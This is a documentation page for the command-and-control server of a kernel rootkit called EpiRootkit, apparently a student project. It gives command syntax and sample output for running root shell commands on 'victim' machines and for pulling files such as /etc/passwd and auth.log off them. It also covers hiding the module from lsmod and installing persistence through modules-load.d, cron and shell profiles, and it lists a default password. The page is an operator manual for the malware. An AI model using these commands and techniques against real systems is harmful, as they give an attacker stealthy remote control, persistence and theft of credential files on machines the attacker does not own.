---
title: "Command Reference"
description: "Complete reference for all C2 server commands"
icon: "terminal"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 32
---

# Command Reference

Complete reference for all C2 server commands with real examples.

## Core Commands

| Command | Description | Authentication Required |
|---------|-------------|------------------------|
| `clients, ls` | List connected rootkit clients | No |
| `auth <client> <password>` | Authenticate with a rootkit client | No |
| `exec <client> <command...>` | Execute shell commands on target system | Yes |
| `upload <client> <localFile> [remoteFile]` | Upload files from attacking machine to victim system | Yes |
| `download <client> <remoteFile> [localFile]` | Download files from victim system to attacking machine | Yes |
| `status <client>` | Get comprehensive rootkit status | Yes |
| `keepalive <client>` | Get detailed keepalive status | Yes |
| `persist <client> [action]` | Manage persistence mechanisms | Yes |
| `config <client>` | Interactive configuration interface | Yes |

## Client Management

### `ls` / `clients`
List connected rootkit clients with authentication status and last seen time.

```bash
c2-server$ ls
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM

c2-server$ clients
# Same output as 'ls'
```

### `auth <client> <password>`
Authenticate with a rootkit client using SHA-512 password verification.

```bash
c2-server$ auth Client-1 password
# ✓ [2025-05-25 16:13:29] Authenticated
# SUCCESS: Authentication successful

# Wrong password
c2-server$ auth Client-1 wrongpass
# ERROR: Authentication failed

# Rate limiting
c2-server$ auth Client-1 wrong1
c2-server$ auth Client-1 wrong2
# ... (after 5 attempts)
# ERROR: Rate limited. Try again in 60 seconds
```

**Security Features:**
- SHA-512 password hashing
- Rate limiting (5 attempts per 60 seconds)
- Session timeout (1 hour)
- Default password: "password"

## Command Execution

### `exec <client> <command...>`
Execute shell commands on target system with full output capture.

```bash
# Basic commands
c2-server$ exec Client-1 whoami
# Exit code: 0
# Output:
# root

c2-server$ exec Client-1 uname -a
# Exit code: 0
# Output:
# Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

# Complex commands with flags
c2-server$ exec Client-1 ps aux | head -10
# Exit code: 0
# Output:
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root         1  0.0  0.1 225468  9876 ?        Ss   15:00   0:01 /sbin/init
# ...

# File operations
c2-server$ exec Client-1 cat /etc/passwd
# Exit code: 0
# Output:
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...
```

**Features:**
- Root privileges execution
- Stdout/stderr capture with exit codes
- Command parsing with flag support
- Real-time output display
- Error handling and validation

## File Operations

### `upload <client> <localFile> [remoteFile]`
Upload files from attacking machine to victim system.

```bash
# Upload to specific path
c2-server$ upload Client-1 ./test.txt /tmp/test.txt
# ✓ File uploaded successfully (1024 bytes)

# Upload to current directory (uses basename)
c2-server$ upload Client-1 ./script.sh
# ✓ File uploaded successfully (512 bytes)

# Upload configuration file
c2-server$ upload Client-1 ./config.conf /etc/myapp/config.conf
# ✓ File uploaded successfully (2048 bytes)
```

### `download <client> <remoteFile> [localFile]`
Download files from victim system to attacking machine.

```bash
# Download to specific local path
c2-server$ download Client-1 /etc/passwd ./victim_passwd
# ✓ File downloaded successfully (2048 bytes)

# Download to current directory (uses basename)
c2-server$ download Client-1 /etc/hostname
# ✓ File downloaded successfully (64 bytes)

# Download log files
c2-server$ download Client-1 /var/log/auth.log ./auth.log
# ✓ File downloaded successfully (15360 bytes)
```

**Features:**
- Base64 encoding for file transfer
- Path validation and security checks
- Automatic path resolution
- Binary and text file support

## System Information

### `status <client>`
Get comprehensive rootkit status information.

```bash
c2-server$ status Client-1
# EpiRootkit Status:
# Version: 1.0.0
# Authentication: YES
# Connection: CONNECTED
# Module Hidden: YES
# Encryption: DISABLED
# Persistence: ENABLED
```

### `keepalive <client>`
Get detailed keepalive and connection status.

```bash
c2-server$ keepalive Client-1
# Keepalive Status:
# Last ping sent: 2025-05-25 16:14:00
# Last pong received: 2025-05-25 16:14:00
# Failed ping count: 0
# Connection stable: YES
# Reconnection attempts: 0
# Current state: CONNECTED
```

## Persistence Management

### `persist <client> [action]`
Manage persistence mechanisms with multiple options.

```bash
# Install all persistence mechanisms
c2-server$ persist Client-1 install
# SUCCESS: All persistence mechanisms installed

# Remove all persistence mechanisms
c2-server$ persist Client-1 remove
# SUCCESS: All persistence mechanisms removed

# Install specific mechanisms
c2-server$ persist Client-1 modules
# SUCCESS: modules-load.d persistence installed

c2-server$ persist Client-1 cron
# SUCCESS: Cron persistence installed

c2-server$ persist Client-1 profile
# SUCCESS: Shell profile persistence installed

# Show help
c2-server$ persist-help
# Persistence Management Commands:
# persist <client> install  - Install all persistence mechanisms
# persist <client> remove   - Remove all persistence mechanisms
# persist <client> modules  - Install modules-load.d persistence
# persist <client> cron     - Install cron persistence
# persist <client> profile  - Install shell profile persistence
```

**Available Mechanisms:**
- **modules-load.d**: Systemd automatic loading (`/etc/modules-load.d/epirootkit.conf`)
- **Cron jobs**: Scheduled loading (`/etc/cron.d/epirootkit`)
- **Shell profiles**: Login-based loading (`/etc/profile.d/epirootkit.sh`)

## Configuration Management

### `config <client>`
Interactive configuration interface for rootkit settings.

```bash
c2-server$ config Client-1
# ┌─ Configuration - Client-1
#   Current Configuration:
#   [X] Module Hiding (Click to disable)
#   [ ] Persistence (Click to enable)
#   
# ? Select option: [Use arrow keys]
#   ❯ [X] Module Hiding (Click to disable)
#     [ ] Persistence (Click to enable)
#     Refresh Status
#     Exit
```

**Available Options:**
- **Module Hiding**: Toggle rootkit visibility in `lsmod`
- **Persistence**: Install/remove boot persistence mechanisms
- **Status Refresh**: Update current configuration display

## Stealth Commands

### Direct Module Control
```bash
# Hide module from lsmod
c2-server$ hide_module Client-1
# SUCCESS: Module hidden

# Unhide module
c2-server$ unhide_module Client-1
# SUCCESS: Module visible

# Check if hidden
c2-server$ exec Client-1 lsmod | grep epirootkit
# (no output if hidden)
```

## Utility Commands

### `clear` / `cls`
Clear the terminal screen.

```bash
c2-server$ clear
# Screen cleared with header message
```

### `help`
Show available commands.

```bash
c2-server$ help
# EpiRootkit C2 Commands
# clients                    - List connected rootkit clients
# auth <client> <password>   - Authenticate with client
# exec <client> <command>    - Execute command on client
# upload <client> <file>     - Upload file to client
# download <client> <file>   - Download file from client
# status <client>            - Get rootkit status
# keepalive <client>         - Get detailed keepalive status
# persist <client> [action]  - Manage persistence mechanisms
# persist-help               - Show persistence usage examples
# config <client>            - Configure rootkit settings
# clear                      - Clear the screen
# exit                       - Exit C2 server
```

### `exit` / `quit`
Exit the C2 server gracefully.

```bash
c2-server$ exit
# Server Status
# [2025-05-25 16:15:00] Shutting down C2 server...
```

## Security Considerations

- All commands except `ls/clients` and `auth` require authentication
- Commands are logged to kernel log via `pr_info()`
- Rate limiting prevents brute force authentication attacks
- Session timeouts ensure security even if connections persist